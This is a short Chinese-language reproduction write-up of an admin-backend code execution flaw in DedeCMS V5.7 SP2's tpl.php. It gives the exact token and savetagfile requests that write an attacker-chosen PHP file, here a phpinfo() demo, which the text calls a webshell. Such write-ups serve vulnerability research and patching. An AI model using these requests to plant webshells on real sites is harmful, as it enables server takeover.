# DedeCMS V5.7 SP2后台代码执行漏洞复现

本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。

## 漏洞描述

织梦内容管理系统(Dedecms)是一款PHP开源网站管理系统。Dedecms V5.7 SP2版本中的 tpl.php 中存在代码执行漏洞，可以通过该漏洞在增加新标签中上传木马，获取webshell。该漏洞利用需要登录后台,并且后台的账户权限是管理员权限。

## 漏洞影响

DedeCMS V5.7 SP2

## 漏洞复现

此漏洞位于后台，因此我们需要先登录到后台

默认后台地址 dede/ ，先按照网上已有的文章复现

先获取 token

```plain
http://www.dedecms521.com/dede/tpl.php?action=upload
```

得到 token

```plain
33980963afa91dcc6c2f1efceefc87b0
```

然后访问

```plain
http://www.dedecms521.com/dede/tpl.php?filename=secnote.lib.php&action=savetagfile&content=<?php phpinfo();?>&token=33980963afa91dcc6c2f1efceefc87b0
```

这时就已经写入了 webshell

```plain
http://www.dedecms521.com/include/taglib/secnote.lib.php
```

![img](https://gitee.com/N0puple/nopic/raw/master/img/image-20210626220121525.png)

## 总结

其实这个漏洞只是 dede 提供的一个文件管理的功能，但是被利用了，基本上只要进到后台，利用这个还是很容易getshell的。

该过程实际上就是

```plain
模板 -> 标签源码管理 -> 增加一个新的标签
```

然后填入自己的代码

```php
<?php phpinfo();?>
```

## 参考链接

- `https://wiki.bylibrary.cn/漏洞库/01-CMS漏洞/DedeCMS/DedeCMS V5.7 SP2后台存在代码执行漏洞/`



`github` 链接：`https://github.com/N0puple/vulPOC`

想要获取更多资讯，或者获取文中环境可以关注公众号 “安全漏洞复现”，回复 “漏洞环境”
